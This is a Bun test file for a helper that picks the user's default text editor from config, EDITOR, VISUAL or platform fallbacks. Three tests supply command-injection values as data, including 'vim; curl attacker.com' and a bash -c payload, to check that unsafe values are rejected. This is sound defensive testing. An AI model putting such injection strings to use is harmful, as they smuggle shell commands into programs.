import { afterAll, beforeEach, describe, expect, test } from "bun:test"
import { commandExists, getDefaultEditor } from "../helpers/getDefaultEditor"
import { HomeConfigUnavailableError } from "../helpers/homeConfig"

describe("getDefaultEditor", () => {
	const originalEditor = process.env.EDITOR
	const originalVisual = process.env.VISUAL

	beforeEach(() => {
		delete process.env.EDITOR
		delete process.env.VISUAL
	})

	afterAll(() => {
		if (originalEditor) process.env.EDITOR = originalEditor
		else delete process.env.EDITOR
		if (originalVisual) process.env.VISUAL = originalVisual
		else delete process.env.VISUAL
	})

	test("returns config editor when set", async () => {
		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({ editor: "code" }),
			commandExists: () => false,
			platform: "linux",
		})
		expect(editor).toBe("code")
	})

	test("returns EDITOR env var when config has no editor", async () => {
		process.env.EDITOR = "vim"

		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: () => false,
			platform: "linux",
		})
		expect(editor).toBe("vim")
	})

	test("returns VISUAL env var when EDITOR is not set", async () => {
		process.env.VISUAL = "nano"

		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: () => false,
			platform: "linux",
		})
		expect(editor).toBe("nano")
	})

	test("falls back to system editor on macOS/Linux", async () => {
		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: (command) => command === "vim",
			platform: "linux",
		})
		expect(editor).toBe("vim")
	})

	test("returns notepad on win32", async () => {
		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: () => false,
			platform: "win32",
		})
		expect(editor).toBe("notepad")
	})

	test("uses safe editor fallbacks when home config is unavailable", async () => {
		process.env.EDITOR = "code"

		const editor = await getDefaultEditor({
			getHomeConfig: async () => {
				throw new HomeConfigUnavailableError()
			},
			commandExists: () => false,
			platform: "win32",
		})

		expect(editor).toBe("code")
	})

	test("throws when no editor is available", async () => {
		await expect(
			getDefaultEditor({
				getHomeConfig: async () => ({}),
				commandExists: () => false,
				platform: "linux",
			}),
		).rejects.toThrow(/No text editor found/)
	})

	test("skips EDITOR env var when it contains shell metacharacters", async () => {
		process.env.EDITOR = "/usr/bin/env -S bash -c 'id > /tmp/pwned' #"

		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: (command) => command === "nano",
			platform: "linux",
		})
		// Should fall through to system defaults, not use the unsafe EDITOR value
		expect(editor).toBe("nano")
		expect(editor).not.toBe(process.env.EDITOR)
	})

	test("skips VISUAL env var when it contains shell metacharacters", async () => {
		process.env.VISUAL = "$(malicious)"

		const editor = await getDefaultEditor({
			getHomeConfig: async () => ({}),
			commandExists: (command) => command === "vi",
			platform: "linux",
		})
		expect(editor).toBe("vi")
		expect(editor).not.toBe(process.env.VISUAL)
	})

	test("throws when config editor contains shell metacharacters", async () => {
		await expect(
			getDefaultEditor({
				getHomeConfig: async () => ({
					editor: "vim; curl attacker.com",
				}),
				commandExists: () => false,
				platform: "linux",
			}),
		).rejects.toThrow(/unsafe characters/)
	})

	test("commandExists returns true for a valid command", () => {
		expect(commandExists("bun")).toBe(true)
	})

	test("commandExists returns false for a missing command", () => {
		expect(commandExists("dotenc_command_that_does_not_exist_123")).toBe(false)
	})
})
